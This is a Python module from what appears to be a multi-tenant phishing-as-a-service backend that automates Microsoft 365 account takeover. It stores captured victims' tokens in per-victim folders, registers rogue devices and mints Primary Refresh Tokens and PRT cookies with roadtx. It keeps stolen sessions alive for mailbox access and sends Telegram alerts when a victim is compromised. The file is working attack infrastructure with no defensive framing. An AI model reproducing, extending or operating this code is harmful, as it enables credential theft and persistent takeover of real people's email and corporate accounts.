# ─ executor.py ───────────────────────────────────────────
import os
import json
import base64
import datetime
import time
import subprocess
import logging
import threading
import shutil
import sys
import queue
import collections
import db
from config import Config

logger = logging.getLogger(__name__)
VICTIMS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'victims')


# ── Per-session refresh serialisation ───────────────────────────────────
# A refresh mutates shared state on disk: the work path runs `roadtx prtauth`
# which writes into the victim's .roadtools_auth, and the personal path
# rewrites the stored refresh token. Three callers can ask for the same
# user_code at once (dashboard mailbox read, keyword watcher, TokenRefresher),
# so without a lock two runs interleave and one reads a half-written file or a
# token the other just rotated away.
_REFRESH_LOCKS = {}
_REFRESH_LOCKS_GUARD = threading.Lock()

# user_code -> unix ts until which refreshes are skipped after a failure.
_REFRESH_COOLDOWN = {}


def _refresh_lock(user_code):
    """Return the dedicated lock for this session, creating it on first use."""
    with _REFRESH_LOCKS_GUARD:
        lock = _REFRESH_LOCKS.get(user_code)
        if lock is None:
            lock = threading.Lock()
            _REFRESH_LOCKS[user_code] = lock
        return lock


def in_refresh_cooldown(user_code):
    """True while this session is backing off after a failed refresh."""
    return time.time() < _REFRESH_COOLDOWN.get(user_code, 0)


def set_refresh_cooldown(user_code, seconds=600):
    _REFRESH_COOLDOWN[user_code] = time.time() + seconds


def clear_refresh_cooldown(user_code):
    _REFRESH_COOLDOWN.pop(user_code, None)


def _decode_jwt(token):
    """Decode JWT payload without verifying signature."""
    try:
        parts = token.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            payload += '=' * (-len(payload) % 4)
            return json.loads(base64.urlsafe_b64decode(payload).decode('utf-8'))
    except Exception:
        pass
    return {}


def _roadtx_expiry():
    """Return an expiresOn string in the format roadtx uses: 'YYYY-MM-DD HH:MM:SS'."""
    future = datetime.datetime.utcnow() + datetime.timedelta(hours=1)
    return future.strftime('%Y-%m-%d %H:%M:%S')


def _decode_jwt_claims(token):
    """Decode a JWT payload without verification (identity claims only)."""
    try:
        payload = token.split('.')[1]
        payload += '=' * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception:
        return {}


def run_roadtx(args, victim_path, log_stdout=True):
    """Execute a roadtx command within the isolated victim directory.

    All file paths are passed via per-subcommand flags so roadtx never
    touches system-level paths.  cwd=victim_path keeps any relative-path
    fallbacks inside the victim folder too.

    Set log_stdout=False for commands whose stdout contains sensitive
    material (e.g. the raw PRT from `roadtx prt`).
    """
    os.makedirs(victim_path, exist_ok=True)
    # Resolve the binary explicitly: the systemd unit's PATH does not include
    # the venv bin dir, so a bare 'roadtx' raises FileNotFoundError and every
    # PRT refresh fails. Prefer the venv copy next to the running interpreter.
    _rtx = os.path.join(os.path.dirname(sys.executable), 'roadtx')
    if not os.path.exists(_rtx):
        _rtx = shutil.which('roadtx') or 'roadtx'
    cmd = [_rtx] + args
    logger.info(f"Running: {' '.join(cmd)}")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            check=True,
            cwd=victim_path
        )
        logger.info(f"Success. Output length: {len(result.stdout)}")
        if log_stdout and result.stdout.strip():
            logger.info(f"STDOUT: {result.stdout.strip()}")
        return result.stdout
    except FileNotFoundError:
        logger.error("CRITICAL: roadtx not found. Ensure it is installed and in PATH.")
        return None
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed (Code {e.returncode})")
        logger.error(f"STDOUT: {e.stdout}")
        logger.error(f"STDERR: {e.stderr}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {e}", exc_info=True)
        return None


def refresh_via_prt(user_code, force=False):
    """Refresh a session's Graph token, serialised per session.

    Two entirely different mechanisms, chosen by account type:

      work     — `roadtx prtauth -c msteams -r https://graph.microsoft.com`
                 against the victim's stored PRT. The PRT is the credential,
                 so the refresh token is never spent.
      personal — a plain OAuth refresh_token grant on the Thunderbird public
                 client. Consumer accounts have no PRT.

    Callers can be concurrent (dashboard, keyword watcher, refresher), and both
    mechanisms mutate shared on-disk state, so the whole thing runs under a
    per-user_code lock. A failure arms a cooldown so a broken session is not
    hammered by every caller; pass force=True to ignore it.

    Returns:
        (True, access_token, expiry_unix)  on success
        (False, None, None)                on any failure or while cooling down

    NOTE: The work path intentionally has NO fallback to a plain RT grant.
    A Broker-scoped token produced by the standard grant breaks mailbox
    access and is therefore worse than doing nothing.
    """
    if not force and in_refresh_cooldown(user_code):
        logger.debug(f"[REFRESH] {user_code}: skipped, in cooldown.")
        return False, None, None

    with _refresh_lock(user_code):
        # Re-check under the lock: a caller that was queued behind a successful
        # refresh should use its result instead of spending the credential again.
        if not force and in_refresh_cooldown(user_code):
            return False, None, None
        ok, at, exp = _refresh_locked(user_code)
        if ok:
            clear_refresh_cooldown(user_code)
        else:
            set_refresh_cooldown(user_code)
        return ok, at, exp


def _refresh_locked(user_code):
    """The actual refresh. Caller must already hold this session's lock."""
    victim_path = os.path.join(VICTIMS_DIR, user_code)
    prt_file    = os.path.join(victim_path, 'roadtx.prt')
    auth_file   = os.path.join(victim_path, '.roadtools_auth')

    # ── Personal (consumer) accounts have no PRT ─────────────────
    # Refresh through the Thunderbird public client on the consumers
    # authority instead — the same client used for capture, so the RT is
    # bound to it and the resulting token resolves against Graph mail.
    sess = db.get_session(user_code) or {}
    if (sess.get('account_type') or 'work') == 'personal':
        rt = sess.get('refresh_token')
        if not rt:
            return False, None, None
        try:
            import requests as _rq
            from config import Config as _Cfg
            resp = _rq.post(_Cfg.TOKEN_URL_V1, data={
                'client_id': _Cfg.PERSONAL_CLIENT_ID,
                'grant_type': 'refresh_token',
                'refresh_token': rt,
                'scope': _Cfg.PERSONAL_SCOPES,
            }, timeout=20)
            data = resp.json()
            if 'access_token' not in data:
                logger.warning(f"[PERSONAL-REFRESH] {user_code}: {str(data.get('error_description'))[:120]}")
                return False, None, None
            new_at = data['access_token']
            new_rt = data.get('refresh_token') or rt
            exp = int(datetime.datetime.utcnow().timestamp()) + int(data.get('expires_in', 3600))
            db.update_session_refreshed_token(user_code, new_at, exp, new_rt)
            logger.info(f"[PERSONAL-REFRESH] {user_code}: token refreshed via Thunderbird client.")
            return True, new_at, exp
        except Exception as e:
            logger.warning(f"[PERSONAL-REFRESH] {user_code}: {e}")
            return False, None, None

    if not os.path.exists(prt_file):
        logger.warning(f"[PRT-REFRESH] {user_code}: roadtx.prt not found — "
                       "post-compromise chain has not been run for this session.")
        return False, None, None

    logger.info(f"[PRT-REFRESH] {user_code}: Refreshing via PRT (msteams client, graph.microsoft.com resource).")
    out = run_roadtx([
        'prtauth',
        '-f', prt_file,
        '--tokenfile', auth_file,
        '-c', 'msteams',
        '-r', 'https://graph.microsoft.com',
    ], victim_path)

    if not out:
        logger.error(f"[PRT-REFRESH] {user_code}: roadtx prtauth command failed.")
        return False, None, None

    try:
        with open(auth_file, 'r', encoding='utf-8') as _f:
            _auth = json.load(_f)
        new_at = _auth.get('accessToken')
        if not new_at:
            logger.error(f"[PRT-REFRESH] {user_code}: accessToken missing from .roadtools_auth after prtauth.")
            return False, None, None

        claims  = _decode_jwt(new_at)
        expiry  = claims.get('exp', 0)
        if not expiry:
            expiry = int(__import__('time').time()) + 3600

        db.update_session_refreshed_token(user_code, new_at, expiry)
        logger.info(f"[PRT-REFRESH] {user_code}: ✓ Teams-scoped token refreshed successfully (exp={expiry}).")
        return True, new_at, expiry

    except Exception as e:
        logger.error(f"[PRT-REFRESH] {user_code}: Failed to read auth file after prtauth: {e}")
        return False, None, None


def _finalize_and_alert(user_code, teams_token, prt_cookie):
    """Save artifacts to db and fire single comprehensive Telegram alert."""
    try:
        db.update_session_artifacts(user_code, teams_token, prt_cookie)
    except Exception as e:
        logger.error(f"Error updating session artifacts: {e}")

    try:
        from main import dispatch_victim_compromised_alert
        threading.Thread(
            target=dispatch_victim_compromised_alert,
            args=(user_code,),
            daemon=True
        ).start()
    except Exception as _e:
        logger.error(f"Failed to dispatch final victim alert: {_e}")


ACTIVE_CHAINS = set()
_CHAIN_LOCK = threading.Lock()

# ── Chain worker pool ────────────────────────────────────────────────────
# Each chain is a subprocess tree (device registration, PRT, DRS). The box has
# one core and throughput plateaus at ~20 concurrent chains, so work is queued
# and drained by a fixed pool of workers.
#
# Previously the semaphore was acquired *inside* execute_post_compromise, which
# runs on a poller thread — so a 100-capture burst blocked 80 poller threads
# waiting for slots. Now the poller hands off to this queue and returns at once.
#
# Scheduling policy (all tenants share one pool, so the queue decides fairness):
#   1. Master-owned captures are served first — the operator's own traffic must
#      not sit behind a tenant campaign.
#   2. Tenants are served round-robin, so one tenant cannot queue-jump another.
#   3. No tenant may hold more than CHAIN_PER_TENANT workers at once, so a large
#      client burst cannot consume the whole pool and stall everyone else.
# This only reorders work; it does not change total throughput. Capacity is a
# separate concern (CHAIN_CONCURRENCY).
CHAIN_CONCURRENCY = int(getattr(Config, 'CHAIN_CONCURRENCY', 10))
CHAIN_PER_TENANT = int(getattr(Config, 'CHAIN_PER_TENANT', 3))
# Admin picks per tenant pick. 3 means admin gets 3 of every 4 slots while both
# lanes have work — admin stays well ahead without starving tenants.
CHAIN_ADMIN_RATIO = int(getattr(Config, 'CHAIN_ADMIN_RATIO', 3))


class ChainScheduler:
    """Priority + round-robin + per-tenant-capped work queue.

    Items are (user_code, owner_id); owner_id None means master-owned. Workers
    block in get() until an item is both available and permitted for its tenant.
    """

    def __init__(self, per_tenant, admin_ratio):
        self._per_tenant = max(1, per_tenant)
        # Admin gets admin_ratio picks out of every (admin_ratio + 1). A hard
        # "admin always wins" rule starves tenants outright during a sustained
        # admin campaign, because the admin deque never empties and the tenant
        # loop is never reached. A ratio keeps admin ahead without starving.
        self._admin_ratio = max(1, admin_ratio)
        self._admin_credit = 0
        self._cond = threading.Condition()
        self._admin = collections.deque()
        self._by_owner = {}
        self._rotation = collections.deque()
        self._inflight = {}
        self._pending = 0
        self._stopped = False

    def put(self, user_code, owner_id):
        with self._cond:
            if owner_id is None:
                self._admin.append(user_code)
            else:
                dq = self._by_owner.get(owner_id)
                if dq is None:
                    dq = collections.deque()
                    self._by_owner[owner_id] = dq
                    self._rotation.append(owner_id)
                dq.append(user_code)
            self._pending += 1
            self._cond.notify()

    def _pick_locked(self):
        """Choose the next user_code, or None if nothing is currently runnable."""
        # Weighted split: admin takes admin_ratio of every admin_ratio+1 picks
        # while both lanes have work, so tenants always make progress.
        tenant_ready = self._any_tenant_runnable()
        if self._admin and (not tenant_ready or self._admin_credit < self._admin_ratio):
            self._admin_credit += 1
            return self._admin.popleft(), None

        picked = self._pick_tenant_locked()
        if picked is not None:
            if self._admin_credit > 0:
                self._admin_credit -= 1
            return picked

        # No tenant runnable after all — fall back to admin if anything queued.
        if self._admin:
            self._admin_credit += 1
            return self._admin.popleft(), None
        return None

    def _any_tenant_runnable(self):
        for owner in self._rotation:
            dq = self._by_owner.get(owner)
            if dq and self._inflight.get(owner, 0) < self._per_tenant:
                return True
        return False

    def _pick_tenant_locked(self):
        # Rotate through tenants; skip empty or already-saturated ones.
        for _ in range(len(self._rotation)):
            owner = self._rotation[0]
            self._rotation.rotate(-1)
            dq = self._by_owner.get(owner)
            if not dq:
                continue
            if self._inflight.get(owner, 0) >= self._per_tenant:
                continue
            return dq.popleft(), owner
        return None

    def get(self):
        """Block until an item is runnable. Returns (user_code, owner_id)."""
        with self._cond:
            while True:
                if self._stopped:
                    return None, None
                picked = self._pick_locked()
                if picked is not None:
                    user_code, owner = picked
                    self._pending -= 1
                    if owner is not None:
                        self._inflight[owner] = self._inflight.get(owner, 0) + 1
                    return user_code, owner
                self._cond.wait(timeout=1.0)

    def task_done(self, owner_id):
        with self._cond:
            if owner_id is not None:
                left = self._inflight.get(owner_id, 0) - 1
                if left > 0:
                    self._inflight[owner_id] = left
                else:
                    self._inflight.pop(owner_id, None)
            # A freed slot may make a capped tenant runnable again.
            self._cond.notify_all()

    def depth(self):
        with self._cond:
            return self._pending

    def stop(self):
        with self._cond:
            self._stopped = True
            self._cond.notify_all()


_CHAIN_QUEUE = ChainScheduler(CHAIN_PER_TENANT, CHAIN_ADMIN_RATIO)
_CHAIN_WORKERS = []
_WORKERS_LOCK = threading.Lock()


def _chain_worker():
    """Drain the chain queue forever. One thread per allowed concurrent chain."""
    while True:
        user_code, owner = _CHAIN_QUEUE.get()
        if user_code is None:              # shutdown sentinel
            return
        try:
            _run_post_compromise_chain(user_code)
        except Exception as e:
            logger.error(f"[EXECUTOR] Chain worker error for {user_code}: {e}")
        finally:
            ACTIVE_CHAINS.discard(user_code)
            _CHAIN_QUEUE.task_done(owner)


def start_chain_workers(count=None):
    """Start the chain worker pool. Idempotent — safe to call more than once."""
    global _CHAIN_WORKERS
    with _WORKERS_LOCK:
        if _CHAIN_WORKERS:
            return len(_CHAIN_WORKERS)
        n = count or CHAIN_CONCURRENCY
        for i in range(n):
            t = threading.Thread(target=_chain_worker, daemon=True,
                                 name=f'chainworker-{i}')
            t.start()
            _CHAIN_WORKERS.append(t)
        logger.info(f"[EXECUTOR] Chain worker pool started ({n} workers).")
        return n


def chain_queue_depth():
    """Pending chains not yet picked up by a worker."""
    return _CHAIN_QUEUE.depth()


def is_chain_running(user_code):
    """Check if the post-compromise device registration & PRT chain is currently running."""
    return user_code in ACTIVE_CHAINS


def is_prt_ready(user_code):
    """Check if roadtx.prt exists on disk for this victim session."""
    victim_path = os.path.join(VICTIMS_DIR, user_code)
    prt_file = os.path.join(victim_path, 'roadtx.prt')
    return os.path.exists(prt_file)


def execute_post_compromise(user_code):
    """Queue the post-compromise chain for a captured victim and return
    immediately.

    Duplicate invocations (concurrent poller threads seeing SUCCESS) are
    skipped — two racing chains corrupt each other's device certs and
    Step 3 PRT generation fails with AADSTS501209.

    Both work and personal sessions are queued: personal chains are short (no
    device registration) but still resolve identity and dispatch the alert."""
    owner_id = None
    try:
        sess = db.get_session(user_code) or {}
        owner_id = sess.get('owner_id')
    except Exception:
        pass

    with _CHAIN_LOCK:
        if user_code in ACTIVE_CHAINS:
            logger.info(f"[EXECUTOR] Chain already running for {user_code} — skipping duplicate.")
            return
        ACTIVE_CHAINS.add(user_code)

    start_chain_workers()
    _CHAIN_QUEUE.put(user_code, owner_id)
    logger.info(f"[EXECUTOR] {user_code}: queued for chain "
                f"(depth {_CHAIN_QUEUE.depth()}, owner={owner_id or 'master'}).")


def _run_post_compromise_chain(user_code):
    session = db.get_session_by_user_code(user_code)
    if not session or session['status'] != 'CAPTURED':
        logger.warning(f"Session {user_code} is not ready for post-compromise.")
        return

    # All victim artifacts live exclusively under this directory
    victim_path = os.path.join(VICTIMS_DIR, user_code)
    os.makedirs(victim_path, exist_ok=True)

    rt        = session['refresh_token']
    at        = session['access_token']
    client_id = session.get('client_id') or Config.CLIENT_ID
    email     = session['victim_email'] or user_code

    # Extract tenantId from the captured access token JWT
    jwt_claims = _decode_jwt(at)
    tenant_id  = jwt_claims.get('tid', 'common')

    # Sanitize device name from the local-part of the email
    device_name = (
        email.split('@')[0]
        .replace('.', '_')
        .replace('-', '_')
        .replace(' ', '_')
    )

    # ── All file paths pinned to victim_path ────────────────────
    auth_file = os.path.join(victim_path, '.roadtools_auth')
    pem_file  = os.path.join(victim_path, f"{device_name}.pem")
    key_file  = os.path.join(victim_path, f"{device_name}.key")
    prt_file  = os.path.join(victim_path, 'roadtx.prt')

    logger.info("=" * 60)
    logger.info(f"[EXECUTOR] Starting chain for {user_code} ({email})")
    logger.info(f"[EXECUTOR] Tenant: {tenant_id}  |  Device: {device_name}")
    logger.info(f"[EXECUTOR] Victim dir: {victim_path}")
    logger.info("=" * 60)

    # ── INITIALIZATION ──────────────────────────────────────────
    # Seed .roadtools_auth using the EXACT key names and date format that
    # roadtx produces itself, so subsequent commands parse it correctly.
    #   - Key is "_clientId" (underscore prefix), not "clientId"
    #   - "expiresOn" is space-formatted: "YYYY-MM-DD HH:MM:SS"
    auth_data = {
        'tokenType':    'Bearer',
        'expiresOn':    _roadtx_expiry(),
        'tenantId':     tenant_id,
        '_clientId':    client_id,
        'accessToken':  at,
        'refreshToken': rt,
    }
    with open(auth_file, 'w') as f:
        json.dump(auth_data, f)
    logger.info(f"Seeded auth file: {auth_file}  (tenant={tenant_id})")

    teams_token_acquired = None

    # ── PERSONAL ACCOUNTS: no post-compromise chain at all ──────
    # Consumer accounts have no device registration, no PRT and no DRS. The
    # captured Thunderbird token already carries Mail.Read/Mail.ReadWrite and
    # is a valid Microsoft Graph credential with a resolvable identity, so the
    # chain adds nothing but latency and failure modes. Resolve the identity
    # from the token claims and finish.
    if (session.get('account_type') or 'work') == 'personal':
        logger.info("[PERSONAL] Consumer account — skipping the entire chain; the captured token is the credential.")
        _claims = _decode_jwt_claims(at)
        _upn = (_claims.get('email')
                or (_claims.get('unique_name') or '').split('#')[-1]
                or _claims.get('preferred_username')
                or _claims.get('upn'))
        # Thunderbird returns OPAQUE (non-JWT) tokens, so claim decoding yields
        # nothing. Fall back to a Graph /me lookup — the profile must be stored
        # or B2B send cannot resolve the sender address and the self-recipient
        # filter silently breaks.
        if not _upn:
            try:
                import requests as _rq
                _resp = _rq.get(
                    'https://graph.microsoft.com/v1.0/me'
                    '?$select=displayName,givenName,surname,userPrincipalName,mail',
                    headers={'Authorization': f'Bearer {at}'}, timeout=15)
                if _resp.status_code == 200:
                    _me = _resp.json()
                    _upn = _me.get('mail') or _me.get('userPrincipalName')
                    if _upn:
                        _claims = {
                            'given_name': _me.get('givenName') or '',
                            'family_name': _me.get('surname') or '',
                            'name': _me.get('displayName') or '',
                        }
                else:
                    logger.warning(f"[PERSONAL] /me lookup returned {_resp.status_code}")
            except Exception as _e:
                logger.warning(f"[PERSONAL] /me lookup failed: {_e}")
        if _upn:
            _given = _claims.get('given_name') or ''
            _family = _claims.get('family_name') or ''
            _name = (_given + ' ' + _family).strip() or _claims.get('name') or _upn.split('@')[0]
            db.update_session_profile(user_code, _name, _upn, 'User')
            logger.info(f"[PERSONAL] Identity resolved from token claims: {_name} <{_upn}>")
        _finalize_and_alert(user_code, at, None)
        return

    # ── WORK ACCOUNTS: the PRT chain starts here ───────────────
    # No FOCI pivot: the captured RT is redeemed exactly once, by the DRS
    # exchange, and each later step consumes the RT the previous step rotated
    # in place. Nothing is re-seeded, so no RT is ever replayed.

    # ── STEP 1: DRS Token Acquisition ──────────────────────────
    # roadtx refreshtokento reads the refreshToken from auth_file, requests a
    # DRS-audience access token, then OVERWRITES auth_file with the new DRS
    # accessToken (and the rotated RT). Step 2 reads the token from there.
    logger.info("[STEP 1] DRS Token Acquisition")
    _drs_out = run_roadtx([
        'refreshtokento',
        '--tokenfile', auth_file,
        '-r', 'drs',
    ], victim_path)

    if not _drs_out:
        logger.error("✗ Step 1 FAILED: DRS token not acquired. Aborting chain.")
        _finalize_and_alert(user_code, None, None)
        return
    logger.info("✓ Step 1 SUCCESS: DRS token written to victim auth file.")

    # ── STEP 2: Device Registration ─────────────────────────────
    # roadtx device register reads the DRS accessToken from auth_file
    # (no --access-token flag needed - it reads it naturally).
    # -c / -k pin the output cert and key to the victim folder explicitly.
    logger.info(f"[STEP 2] Device Registration (Name: {device_name})")
    reg_out = run_roadtx([
        'device',
        '-a', 'register',
        '-n', device_name,
        '-c', pem_file,
        '-k', key_file,
    ], victim_path)

    if not reg_out:
        logger.error("✗ Step 2 FAILED: Device registration command failed. Aborting.")
        _finalize_and_alert(user_code, teams_token_acquired, None)
        return

    if not (os.path.exists(pem_file) and os.path.exists(key_file)):
        dir_contents = os.listdir(victim_path)
        logger.error(
            f"✗ Step 2 FAILED: Cert files not found after registration.\n"
            f"  Expected : {pem_file}\n"
            f"           : {key_file}\n"
            f"  Dir      : {dir_contents}"
        )
        db.update_session_artifacts(user_code, teams_token_acquired, None)
        _finalize_and_alert(user_code, teams_token_acquired, None)
        return
    logger.info(f"✓ Step 2 SUCCESS: Device registered. Certs saved to victim folder.")

    # ── STEP 3: PRT Generation ──────────────────────────────────
    # --refresh-token file  → read the RT from auth_file (the word "file"
    #                          is a roadtx keyword, not a path)
    # -c / -k              → victim device cert and key
    # -f                   → write roadtx.prt into the victim folder
    #
    # log_stdout=False because roadtx prints the raw PRT to stdout and we
    # must NOT log sensitive key material.
    logger.info("[STEP 3] PRT Generation")
    prt_out = run_roadtx([
        'prt',
        '--refresh-token', 'file',
        '-c', pem_file,
        '-k', key_file,
        '-f', prt_file,
    ], victim_path, log_stdout=False)

    if not prt_out:
        logger.error("✗ Step 3 FAILED: PRT generation command failed. Aborting.")
        _finalize_and_alert(user_code, teams_token_acquired, None)
        return

    if not os.path.exists(prt_file):
        logger.error(f"✗ Step 3 FAILED: {prt_file} not found after prt command.")
        _finalize_and_alert(user_code, teams_token_acquired, None)
        return
    logger.info(f"✓ Step 3 SUCCESS: PRT saved to victim folder.")

    # ── STEP 4: PRT-Based Teams Token Acquisition (fallback) ────
    # -f           → read PRT from victim folder (not system default)
    # --tokenfile  → write resulting token into victim auth file
    # -r           → full URL (not alias) as proven to work in manual test
    if not teams_token_acquired:
        logger.info("[STEP 4] PRT-Based Teams Token Acquisition")
        step5_out = run_roadtx([
            'prtauth',
            '-f', prt_file,
            '--tokenfile', auth_file,
            '-c', 'msteams',
            '-r', 'https://graph.microsoft.com',
        ], victim_path)

        if step5_out:
            # prtauth writes the token to auth_file and only prints a log
            # message to stdout.  Read the real accessToken from the file.
            try:
                with open(auth_file) as _f:
                    _auth = json.load(_f)
                teams_token_acquired = _auth.get('accessToken')
                if teams_token_acquired:
                    logger.info("✓ Step 4 SUCCESS: Teams access token read from victim auth file.")
                    # Also update the session's primary access_token so the
                    # graph proxy can use it immediately without a refresh.
                    at_claims = _decode_jwt(teams_token_acquired)
                    db.update_session_refreshed_token(
                        user_code, teams_token_acquired,
                        at_claims.get('exp', 0)
                    )
                else:
                    logger.error("✗ Step 4 FAILED: accessToken missing from auth file after prtauth.")
            except Exception as _e:
                logger.error(f"✗ Step 4 FAILED: Could not read auth file after prtauth: {_e}")
        else:
            logger.error("✗ Step 4 FAILED: Could not acquire Teams token via PRT.")
    else:
        # FOCI token acquired in Step 1 is raw stdout — read the real JWT
        # from the auth file that refreshtokento wrote during Step 1.
        # NOTE: auth_file was re-seeded before Step 2, so if Step 1 succeeded
        # the token is already in teams_token_acquired as the stdout payload.
        # For safety, try to parse it as the auth file JSON.
        try:
            _tok_data = json.loads(teams_token_acquired)
            if isinstance(_tok_data, dict) and 'accessToken' in _tok_data:
                teams_token_acquired = _tok_data['accessToken']
        except (json.JSONDecodeError, TypeError):
            pass  # already a raw JWT string from a prior run, keep as-is
        logger.info("[STEP 4] SKIPPED: Teams token already acquired in Step 1.")

    # ── STEP 5: PRT Cookie Extraction ───────────────────────────
    # -f → read PRT from victim folder.
    # roadtx stdout format:
    #   "PRT cookie: <JWT>\nCan be used in external browsers..."
    # We extract just the JWT value and discard the surrounding text.
    logger.info("[STEP 5] PRT Cookie Extraction")
    prt_cookie_raw = run_roadtx([
        'prtcookie',
        '-f', prt_file,
    ], victim_path)

    prt_cookie_out = None
    if prt_cookie_raw:
        for line in prt_cookie_raw.splitlines():
            line = line.strip()
            if line.startswith('PRT cookie:'):
                prt_cookie_out = line.replace('PRT cookie:', '').strip()
                break
        if prt_cookie_out:
            logger.info("✓ Step 5 SUCCESS: PRT cookie extracted (JWT only).")
        else:
            logger.warning("⚠ Step 6: Command succeeded but could not parse cookie from output.")
            logger.warning(f"Raw output: {prt_cookie_raw[:200]}")
    else:
        logger.error("✗ Step 5 FAILED: PRT cookie not extracted.")

    # ── FINALIZATION & SINGLE RICH TELEGRAM ALERT ────────────────
    _finalize_and_alert(user_code, teams_token_acquired, prt_cookie_out)
    logger.info("=" * 60)
    logger.info(f"[EXECUTOR] Chain completed for {user_code}. Artifacts saved.")
    logger.info("=" * 60)
